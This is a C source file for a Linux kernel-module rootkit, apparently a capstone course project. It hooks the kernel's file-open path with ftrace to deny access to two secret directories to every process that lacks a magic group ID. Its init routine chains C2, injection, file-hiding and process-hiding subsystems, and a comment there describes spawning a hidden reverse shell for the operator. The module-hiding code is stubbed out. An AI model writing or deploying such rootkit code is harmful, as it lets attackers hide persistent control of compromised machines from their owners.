/*
 * rootkit.c: access blocking, module hiding, init/exit
 *
 * blocking_init/exit: install a hook that intercepts file opens and denies
 * access to HIDDEN_DIR_1 and HIDDEN_DIR_2. Traversal paths like
 * ../../../tmp/secret must also be blocked. Processes with MAGIC_GID in
 * their supplementary groups bypass the block entirely.
 *
 * hide_module/show_module: remove and restore this module from the kernel's
 * module list so it does not appear in lsmod or /proc/modules.
 *
 * rootkit_init/exit: initialize all subsystems in order with goto-based
 * error unwinding. Tear down in reverse order on exit.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/namei.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alice&Bob");
MODULE_DESCRIPTION("Capstone LKM rootkit, access blocking with path protection");

/* Access blocking*/

static unsigned long target_func_addr;
bool blocking_active;


static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
{
  int ret;
  char raw_buf[MAX_PATH_LEN];
  char resolved_buf[MAX_PATH_LEN];
  struct path resolved_path;
  char *resolved;
  size_t hd1_len = sizeof(HIDDEN_DIR_1) - 1;
  size_t hd2_len = sizeof(HIDDEN_DIR_2) - 1;

  if (!blocking_active) 
    return;

  //user to kernel buffer -> kern_path -> d_path return value -> path_put
  const char __user *filename = (const char __user *)ftrace_regs_get_argument(fregs, 1);

  ret = strncpy_from_user(raw_buf, filename, sizeof(raw_buf));
  if (ret < 0)
    return;

  if (kern_path(raw_buf, LOOKUP_FOLLOW, &resolved_path) == 0) {
    resolved = d_path(&resolved_path, resolved_buf, sizeof(resolved_buf));
    path_put(&resolved_path);

    if (IS_ERR(resolved))
      return;
  } else {
    resolved = raw_buf;
  }

  // check against /tmp/secret
  if (strncmp(resolved, HIDDEN_DIR_1, hd1_len) == 0){  
    if (resolved[hd1_len] == '\0' || resolved[hd1_len] == '/') {
      if (caller_has_magic_gid() == false) {
        fregs->regs[1] = 0;               //deny access   
        //ftrace_regs_set_argument(fregs, 1, 0)
        pr_info("[rootkit][blocking] Blocked access to %s", HIDDEN_DIR_1);
      }
    } 
  }

  //check against /dev/shm/secret
  if (strncmp(resolved, HIDDEN_DIR_2, hd2_len) == 0){  
    if (resolved[hd2_len] == '\0' || resolved[hd2_len] == '/') {
      if (caller_has_magic_gid() == false) {
        fregs->regs[1] = 0;               //deny access   
        //ftrace_regs_set_argument(fregs, 1, 0)
        pr_info("[rootkit][blocking] Blocked access to %s", HIDDEN_DIR_2);
      }
    } 
  }
}


static struct ftrace_ops blocking_ops = {
	.func  = blocking_callback,
	.flags = FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION,
};


int blocking_init(void)
{
  int ret;

  target_func_addr = kprobe_lookup("do_sys_openat2");
  if (target_func_addr == 0) return -ENOENT;

  ret = ftrace_set_filter_ip(&blocking_ops, target_func_addr, 0, 0);
  if (ret < 0) return ret;

  ret = register_ftrace_function(&blocking_ops);
  if (ret < 0) {
    ftrace_set_filter_ip(&blocking_ops, target_func_addr, 1, 0);
    return ret;
  }

  blocking_active = true;
  return 0;
}

void blocking_exit(void)
{
  unregister_ftrace_function(&blocking_ops);
  ftrace_set_filter_ip(&blocking_ops, target_func_addr, 1, 0);
  
  blocking_active = false;

  pr_info("[rootkit][blocking] ftrace unregistered\n");
}

/* Module self-hiding */
/*
static bool module_hidden;
static struct list_head *saved_prev;

void hide_module(void)
{
}

void show_module(void)
{
}
*/

/* Module init/exit */

static int __init rootkit_init(void)
{
	int ret;
  pr_info("[rootkit] initializing\n");
	/* Once the hiding hooks are active, spawn your reverse shell (or
	* whatever persistent operator process you use) and mark it with
	* your operator identifier (e.g. the magic GID) so it is hidden
	* and has bypass access from the moment it starts. */

  ret = c2_init();
  if (ret < 0) {
    return ret;
  }

  ret = inject_init();
  if (ret < 0) {
    goto errorpoint1;
  }

  ret = file_hide_init();
  if (ret < 0) {
    goto errorpoint2;
  }

  ret = proc_hide_init();
  if (ret < 0) {
    goto errorpoint3;
  }

  ret = blocking_init();
  if (ret < 0) {
    goto errorpoint4;
  }

  pr_info("[rootkit] All modules loaded");
	return 0;

  //goto based error unwinding
errorpoint4:
  proc_hide_exit();
errorpoint3:
  file_hide_exit();
errorpoint2:
  inject_exit();
errorpoint1:
  c2_exit();
  
  return ret;
}

static void __exit rootkit_exit(void)
{
	pr_info("[rootkit] cleaning up\n");
	
  blocking_exit();
  proc_hide_exit();
  file_hide_exit();
  inject_exit();
  c2_exit();

  pr_info("[rootkit] All modules unloaded");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
